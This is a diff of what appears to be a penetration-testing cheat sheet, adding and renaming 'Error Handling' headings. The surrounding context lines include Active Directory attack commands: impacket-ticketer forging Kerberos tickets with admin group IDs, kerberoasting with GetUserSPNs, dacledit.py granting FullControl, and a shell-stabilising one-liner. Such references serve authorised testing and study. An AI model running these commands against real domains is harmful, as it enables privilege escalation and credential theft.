@@ -1467,13 +1467,15 @@ script -q /dev/null -c bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
-### Oneliner
+##### Oneliner
 
 ```shell
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-#### Fixing Staircase Effect
+##### Error Handling
+
+###### Fixing Staircase Effect
 
 ```shell
 env reset
@@ -5667,9 +5669,11 @@ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-
 impacket-ticketer -nthash 89551acff8895768e489bb3054af94fd -domain-sid S-1-5-21-2847563149-1937258901-3562441728 -domain 89551acff8895768e489bb3054af94fd -spn MSSQLSVC/<RHOST> -groups 512,519,1105 -user-id 1103 mssqlsvc
 ```
 
+###### Error Handling
+
 ###### Fixing [-] exceptions must derive from BaseException
 
-###### Issue
+###### Error Message
 
 ```shell
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
@@ -5678,7 +5682,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [-] exceptions must derive from BaseException
 ```
 
-###### To fix it
+###### Fix
 
 ```shell
 241         if self.__doKerberos:
@@ -5697,6 +5701,8 @@ python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>
 python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
 python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
 ```
+
+###### Error Handling
 
 ###### Fixing msada_guids Error
 
@@ -7539,7 +7545,9 @@ export KRB5CCNAME=<USERNAME>.ccache
 python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
 ```
 
-##### Fixing socket ssl wrapping error: [Errno 104] Connection reset by peer Error
+##### Error Handling
+
+###### Fixing socket ssl wrapping error: [Errno 104] Connection reset by peer Error
 
 > https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7
 
